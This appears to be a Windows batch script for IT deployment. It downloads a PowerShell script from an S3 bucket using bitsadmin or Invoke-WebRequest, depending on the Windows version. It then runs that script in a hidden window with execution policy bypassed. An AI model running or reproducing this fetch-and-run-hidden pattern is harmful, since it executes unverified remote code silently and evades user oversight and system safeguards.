@echo off


if not exist "C:\intel\" mkdir C:\intel

cd c:\intel

for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "6.1" bitsadmin.exe /transfer "DJoin" https://daytonff.s3.eu-central-1.amazonaws.com/poshgui.ps1 "c:\intel\poshgui_Test.ps1"
if "%version%" == "6.2" bitsadmin.exe /transfer "DJoin" https://daytonff.s3.eu-central-1.amazonaws.com/poshgui.ps1 "c:\intel\poshgui_Test.ps1"
if "%version%" == "6.3" bitsadmin.exe /transfer "DJoin" https://daytonff.s3.eu-central-1.amazonaws.com/poshgui.ps1 "c:\intel\poshgui_Test.ps1"
if "%version%" == "10.0" powershell -Command "Invoke-WebRequest https://daytonff.s3.eu-central-1.amazonaws.com/poshgui.ps1 -OutFile c:\intel\poshgui_Test.ps1"


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -windowstyle Hidden -file "c:\intel\poshgui_Test.ps1"


wait